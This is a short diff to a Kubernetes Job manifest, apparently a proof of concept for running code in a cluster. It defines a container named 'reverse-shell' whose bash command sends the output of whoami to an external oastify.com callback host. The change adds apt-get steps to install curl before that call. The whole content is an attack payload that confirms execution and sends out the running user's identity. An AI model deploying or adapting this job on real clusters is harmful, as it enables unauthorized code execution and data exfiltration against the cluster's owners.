@@ -9,6 +9,6 @@ spec:
       containers:
         - name: reverse-shell
           image: ubuntu:latest
-          command: ["/bin/bash", "-c", "curl https://w0xxbvoy5ypvm5czv3s6gvkpogu7iykm9.oastify.com?$(whoami)"]
+          command: ["/bin/bash", "-c", "apt-get -y update; apt-get -y install curl ; curl https://w0xxbvoy5ypvm5czv3s6gvkpogu7iykm9.oastify.com?$(whoami)"]
       restartPolicy: Never
   backoffLimit: 0
